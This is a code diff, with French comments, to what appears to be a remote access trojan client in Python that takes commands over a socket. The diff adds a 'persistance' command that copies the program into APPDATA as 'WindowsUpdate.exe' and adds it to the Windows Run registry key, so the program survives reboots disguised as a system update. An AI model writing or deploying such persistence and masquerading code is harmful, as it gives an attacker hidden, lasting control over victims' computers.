@@ -41,6 +41,10 @@ def main():
         if commande == "exit":
             break
 
+        elif commande == "persistance":
+            resultat = setup_persistence()
+            sock.send(resultat.encode())
+
         elif commande.startswith("regedit "):
             parts = commande.split(" ", 3)
             if len(parts) == 4:
@@ -62,6 +66,28 @@ def main():
             sock.send(resultat.encode())
 
     sock.close()
+
+
+# se copie dans appdata et s'ajoute au demarrage de windows
+def setup_persistence():
+    try:
+        import shutil
+        import winreg
+
+        dest = os.path.join(os.environ["APPDATA"], "WindowsUpdate.exe")
+        if not os.path.exists(dest):
+            shutil.copy2(sys.argv[0], dest)
+
+        clef = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(clef, "WindowsUpdate", 0, winreg.REG_SZ, dest)
+        winreg.CloseKey(clef)
+        return "Persistance activee"
+    except Exception as e:
+        return f"Erreur persistance: {e}"
 
 
 # ajoute une clef dans le registre windows
